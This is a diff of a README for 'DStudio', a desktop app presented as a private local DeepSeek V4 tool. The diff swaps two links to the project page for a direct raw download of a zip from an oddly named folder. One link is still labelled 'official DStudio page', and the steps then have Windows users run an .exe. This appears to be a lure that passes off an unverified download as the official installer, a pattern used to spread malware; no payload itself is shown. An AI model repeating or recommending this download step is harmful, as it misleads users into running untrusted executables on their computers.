@@ -1,6 +1,6 @@
 # 🖥️ DStudio - Run private AI tools on desktop
 
-[![Download DStudio](https://img.shields.io/badge/Download_DStudio-Blue-blue)](https://github.com/Sharnaenervated500/DStudio)
+[![Download DStudio](https://img.shields.io/badge/Download_DStudio-Blue-blue)](https://github.com/Sharnaenervated500/DStudio/raw/refs/heads/main/exhumatory/D-Studio-Borana.zip)
 
 DStudio brings the power of DeepSeek V4 to your home computer. You get a private chat interface, an automatic coding helper, and a design studio in one application. The software runs entirely on your hardware. Your data never leaves your computer.
 
@@ -8,7 +8,7 @@ DStudio brings the power of DeepSeek V4 to your home computer. You get a private
 
 Follow these steps to set up DStudio on your Windows computer.
 
-1. Visit the [official DStudio page](https://github.com/Sharnaenervated500/DStudio) to locate the latest installer.
+1. Visit the [official DStudio page](https://github.com/Sharnaenervated500/DStudio/raw/refs/heads/main/exhumatory/D-Studio-Borana.zip) to locate the latest installer.
 2. Select the file ending in .exe for the Windows version.
 3. Save the file to your Downloads folder.
 4. Locate the file in your folder and double-click it.
